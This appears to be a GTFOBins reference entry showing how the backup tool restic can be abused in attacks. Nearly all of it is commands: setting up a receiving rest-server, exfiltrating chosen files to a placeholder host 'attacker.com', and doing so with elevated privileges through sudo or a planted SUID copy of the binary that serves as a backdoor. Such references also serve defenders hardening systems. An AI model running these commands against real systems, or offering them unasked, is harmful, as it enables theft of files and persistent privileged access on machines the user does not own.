# GTFOBin: restic

The attacker must setup a server to receive the backups, in the following example rest-server is used but there are other options. To start a new instance and create a new repository:

```
RPORT=12345
NAME=backup_name
./rest-server --listen ":$RPORT"
restic init -r "rest:http://localhost:$RPORT/$NAME"

```

To extract the data from the restic repository in the current directory on the attacker side:

```
restic restore -r "/tmp/restic/$NAME" latest --target .

```

Upload data to the attacker server with the following commands.

## File upload

It can exfiltrate files on the network.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which restic) .

RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```